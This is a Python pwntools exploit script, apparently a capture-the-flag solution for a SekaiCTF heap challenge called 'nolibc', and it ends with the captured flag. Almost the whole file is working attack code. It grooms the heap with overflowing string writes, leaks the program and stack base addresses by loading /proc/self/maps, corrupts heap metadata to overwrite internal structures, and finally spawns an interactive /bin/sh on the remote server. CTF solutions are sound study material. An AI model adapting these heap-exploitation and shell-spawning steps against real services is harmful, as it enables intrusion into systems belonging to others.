#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

# io = process("./main")
io = remote("nolibc.chals.sekai.team", 1337, ssl=True)
elf = ELF("./main", checksec=False)

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "140"]


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def cmd_1(choice):
    ru(b"Choose an option: ")
    sl(i2b(choice))


def register(name, passwd):
    cmd_1(2)
    ru(b"Username: ")
    sl(name)
    ru(b"Password: ")
    sl(passwd)


def login(name, passwd):
    cmd_1(1)
    ru(b"Username: ")
    sl(name)
    ru(b"Password: ")
    sl(passwd)


register(b"eastXueLian", b"NailEuxTsae")
login(b"eastXueLian", b"NailEuxTsae")


def cmd(choice):
    ru(b"Choose an option: ")
    sl(i2b(choice))


def add(size, data):
    cmd(1)
    ru(b"Enter string length: ")
    sl(i2b(size))
    ru(b"Enter a string: ")
    if len(data) < size + 1:
        sl(data)
    else:
        s(data)


def delet(idx):
    cmd(2)
    ru(b"Enter the index of the string to delete: ")
    sl(i2b(idx))


def show():
    cmd(3)


def save(name):
    cmd(4)
    ru(b"Enter the filename: ")
    sl(name)


def load(name):
    cmd(5)
    ru(b"Enter the filename: ")
    sl(name)


add(0x100, b"a" * 0x101)
add(0x100, b"b" * 0x101)
add(0x100, b"c" * 0x101)
add(0xD0, b"d" * 0xD1)
delet(2)
add(0x10, b"exl")
add(0x10, b"exl")
load(b"/proc/self/maps")

show()
ru(b"String 5: ")
elf_base = int(ru(b"-", drop=True), 16)
ru(b"String 15: ")
stack_base = int(ru(b"-", drop=True), 16)
lg("elf_base", elf_base)

for _ in range(((0x8000 + 0x2CB0) // 0x110) - 3):
    add(0x100, b"a" * 0x40)

add(0xBF, b"aaa")
add(0x9F - 0x20, b"aaa")

add(0xF, b"a")
add(0xF, b"a")
add(0xCF, b"a" * (0xC0 - 0x10) + p64(0x80) + p64(0xDEADBEEF))
delet(0)

add(0xF0, b"a" * 0xF1)  # 181 # 183
add(0x40, p64(0x110))
add(0x40, b"xxx2")
add(0x40, b"xxx3")
add(0x40, b"xxx4")


delet(183 + (183 - 181))
delet(0)
add(0x100, flat({0x40: [0x80, elf_base + 0x15000 - 0x10]}))
add(0x70, p64(0xCAFECAFE))
add(
    0x7F,
    flat(
        {
            0: [
                0x100000000,
                0x30000003B,
                0x3B,
                1,
                elf_base + 0x5070,
                0,
                0x8030,
            ],
            0x70: [elf_base + 0x15030],
        },
        filler=b"\x00",
    ),
)

load(b"/bin/sh\x00")
ia()

# SEKAI{shitty_heap_makes_a_shitty_security}
